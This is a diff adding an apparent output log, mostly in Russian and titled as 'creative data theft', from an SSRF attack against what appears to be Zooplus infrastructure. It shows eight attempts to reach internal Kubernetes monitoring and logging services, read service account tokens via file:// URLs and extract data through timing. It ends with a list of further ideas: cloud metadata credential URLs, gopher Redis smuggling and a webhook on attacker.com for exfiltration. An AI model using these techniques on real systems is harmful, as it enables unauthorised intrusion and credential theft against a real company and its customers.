@@ -1,0 +1,185 @@
+[*] Logging in...
+[+] Logged in
+
+================================================================================
+КРЕАТИВНАЯ КРАЖА ДАННЫХ - ВСЕ ВОЗМОЖНЫЕ СПОСОБЫ
+================================================================================
+
+================================================================================
+МЕТОД 1: EXPLOIT PROMETHEUS ALERTMANAGER WEBHOOK
+================================================================================
+
+Идея: Prometheus Alertmanager может отправлять webhooks при alerts.
+Если мы можем создать alert через API, он отправит данные на наш webhook!
+
+
+[*] Пробуем: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/admin/receivers
+    Status: 200
+    Headers: {'Content-Type': 'application/json', 'Content-Length': '6', 'Connection': 'keep-alive', 'date': 'Thu, 11 Dec 2025 06:31:23 GMT', 'server': 'istio-envoy', 'vary': 'User-Agent,Accept-Encoding', 'x-envoy-upstream-service-time': '21', 'content-encoding': 'br', 'Via': '1.1 760a29e891ec10bba1274911260e1fc8.cloudfront.net (CloudFront)', 'Alt-Svc': 'h3=":443"; ma=86400', 'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload', 'Cross-Origin-Opener-Policy': 'same-origin-allow-popups', 'Set-Cookie': 'sid=6ce79450-a5f0-4c0a-9c95-10d69e9c1f50; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de', 'x-lambda-region': 'eu-central-1', 'X-Stream-Status': 'Log', 'X-Cache': 'Miss from cloudfront', 'X-Amz-Cf-Pop': 'FRA60-P4', 'X-Amz-Cf-Id': '6agtkfNI8dmRD_51f29b86FKZfqgJTCPNbdl-3zjWNxO-RXhXWtcAw=='}
+
+[*] Пробуем: http://prometheus.monitoring.svc.cluster.local:9090/api/v1/alerts
+    Status: 200
+    Headers: {'Content-Type': 'application/json', 'Content-Length': '6', 'Connection': 'keep-alive', 'date': 'Thu, 11 Dec 2025 06:31:23 GMT', 'server': 'istio-envoy', 'vary': 'User-Agent,Accept-Encoding', 'x-envoy-upstream-service-time': '17', 'content-encoding': 'br', 'Via': '1.1 760a29e891ec10bba1274911260e1fc8.cloudfront.net (CloudFront)', 'Alt-Svc': 'h3=":443"; ma=86400', 'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload', 'Cross-Origin-Opener-Policy': 'same-origin-allow-popups', 'Set-Cookie': 'sid=6ce79450-a5f0-4c0a-9c95-10d69e9c1f50; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de', 'x-lambda-region': 'eu-central-1', 'X-Stream-Status': 'Log', 'X-Cache': 'Miss from cloudfront', 'X-Amz-Cf-Pop': 'FRA60-P4', 'X-Amz-Cf-Id': '7hgvvYc_hshmXZcix_Gal4kazLfbZvavDc4Gx4EEcntuTxaC6XMbOg=='}
+
+[*] Пробуем: http://alertmanager.monitoring.svc.cluster.local:9093/api/v1/alerts
+    Status: 200
+    Headers: {'Content-Type': 'application/json', 'Content-Length': '6', 'Connection': 'keep-alive', 'date': 'Thu, 11 Dec 2025 06:31:23 GMT', 'server': 'istio-envoy', 'vary': 'User-Agent,Accept-Encoding', 'x-envoy-upstream-service-time': '29', 'content-encoding': 'br', 'Via': '1.1 760a29e891ec10bba1274911260e1fc8.cloudfront.net (CloudFront)', 'Alt-Svc': 'h3=":443"; ma=86400', 'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload', 'Cross-Origin-Opener-Policy': 'same-origin-allow-popups', 'Set-Cookie': 'sid=6ce79450-a5f0-4c0a-9c95-10d69e9c1f50; Max-Age=34560000; SameSite=Lax; HttpOnly; Secure; Path=/; Domain=.zooplus.de', 'x-lambda-region': 'eu-central-1', 'X-Stream-Status': 'Log', 'X-Cache': 'Miss from cloudfront', 'X-Amz-Cf-Pop': 'FRA60-P4', 'X-Amz-Cf-Id': 'PSMECJ86I0Jy7iqlCqyRsZZSNvBZHQST4InttdSR8WSJbPmBLTcTug=='}
+
+================================================================================
+МЕТОД 2: GRAFANA NOTIFICATION CHANNELS
+================================================================================
+
+Идея: Grafana имеет notification channels для отправки alerts.
+Попробуем создать notification channel который отправит данные.
+
+
+[*] GET http://grafana.monitoring.svc.cluster.local:3000/api/alert-notifications
+    Status: 200, Body length: 2
+
+[*] GET http://grafana.monitoring.svc.cluster.local:3000/api/notifications
+    Status: 200, Body length: 2
+
+[*] GET http://grafana.monitoring.svc.cluster.local:3000/api/datasources
+    Status: 200, Body length: 2
+
+================================================================================
+МЕТОД 3: ELASTICSEARCH WATCHER / EXPORT
+================================================================================
+
+Идея: Elasticsearch Watcher может отправлять данные на webhook.
+Или может быть есть export functionality.
+
+
+[*] http://elasticsearch.logging.svc.cluster.local:9200/_watcher/watch/_execute
+    Status: 200, Length: 2
+
+[*] http://elasticsearch.logging.svc.cluster.local:9200/_search
+    Status: 200, Length: 2
+
+[*] http://elasticsearch.logging.svc.cluster.local:9200/_cluster/state
+    Status: 200, Length: 2
+
+[*] http://elasticsearch.logging.svc.cluster.local:9200/_all/_search?size=1
+    Status: 200, Length: 2
+
+================================================================================
+МЕТОД 4: KUBERNETES SERVICE ACCOUNT TOKEN
+================================================================================
+
+Идея: В Kubernetes pod обычно есть service account token в:
+/var/run/secrets/kubernetes.io/serviceaccount/token
+
+Попробуем прочитать через file:// protocol.
+
+
+[*] file:///var/run/secrets/kubernetes.io/serviceaccount/token
+    Status: 200, Length: 2
+
+[*] file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
+    Status: 200, Length: 2
+
+[*] file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+    Status: 200, Length: 2
+
+================================================================================
+МЕТОД 5: HTTP REDIRECT CHAIN
+================================================================================
+
+Идея: Некоторые сервисы делают redirect с данными в Location header.
+Проверяем редиректы.
+
+
+[*] Redirect test:
+    Status: 200
+    Location header: N/A
+
+================================================================================
+МЕТОД 6: CHAR-BY-CHAR EXTRACTION ПРИ ПОМОЩИ TIMING
+================================================================================
+
+Идея: Используем boolean-based blind extraction.
+Если URL содержит определенный символ → разное время ответа.
+
+
+[*] Пробуем извлечь первый символ K8s версии...
+    Testing char '0': 187.71ms
+      [!] Possible match!
+    Testing char '1': 189.39ms
+      [!] Possible match!
+    Testing char '2': 180.99ms
+      [!] Possible match!
+    Testing char '3': 476.64ms
+    Testing char '4': 171.71ms
+      [!] Possible match!
+    Testing char '5': 182.21ms
+      [!] Possible match!
+    Testing char '6': 218.65ms
+    Testing char '7': 188.67ms
+      [!] Possible match!
+    Testing char '8': 195.90ms
+      [!] Possible match!
+    Testing char '9': 165.96ms
+      [!] Possible match!
+    Testing char '.': 211.44ms
+    Testing char 'v': 197.97ms
+      [!] Possible match!
+
+[+] Возможные символы в версии: ['0', '1', '2', '4', '5', '7', '8', '9', 'v']
+
+================================================================================
+МЕТОД 7: SSRF CHAIN С ДРУГИМИ ЭНДПОИНТАМИ
+================================================================================
+
+Идея: Использовать SSRF для POST в другой эндпоинт Zooplus,
+который может отразить данные.
+
+
+[*] Ищем эндпоинты которые отражают данные...
+    POST to K8s configmaps: 200
+
+================================================================================
+МЕТОД 8: ИСПОЛЬЗОВАТЬ SSRF ДЛЯ ВНЕДРЕНИЯ В ЛОГИ
+================================================================================
+
+Идея: Отправить запрос с уникальным ID в URL.
+Затем прочитать логи Elasticsearch/Kibana и найти этот ID.
+
+
+[*] Отправили запрос с ID: SSRF-TEST-1765434622
+    Поиск в логах: Status 200, Length 2
+
+================================================================================
+РЕЗУЛЬТАТЫ КРЕАТИВНОЙ КРАЖИ
+================================================================================
+
+[+] Протестировано методов: 8
+[+] Украдено данных: 0
+
+[*] Не удалось украсть данные креативными методами
+
+[*] СЛЕДУЮЩИЙ ШАГ: Попробовать другие идеи...
+
+
+ДРУГИЕ ИДЕИ ДЛЯ ПРОВЕРКИ:
+
+1. AWS/GCP Metadata
+   - http://169.254.169.254/latest/meta-data/iam/security-credentials/
+   - http://metadata.google.internal/computeMetadata/v1/
+
+2. Redis Protocol Smuggling
+   - gopher://localhost:6379/_CONFIG%20GET%20*
+   - Может вернуть конфигурацию Redis
+
+3. MySQL Protocol
+   - Попробовать подключиться к MySQL через SSRF
+
+4. Internal Admin Panels
+   - http://localhost:8080/admin
+   - http://localhost:9090/admin
+
+5. Webhook Services
+   - Использовать SSRF для регистрации webhook на attacker.com
+   - Затем триггернуть event который отправит данные
+    
+
+[+] Результаты сохранены: logs/creative_theft_results.json
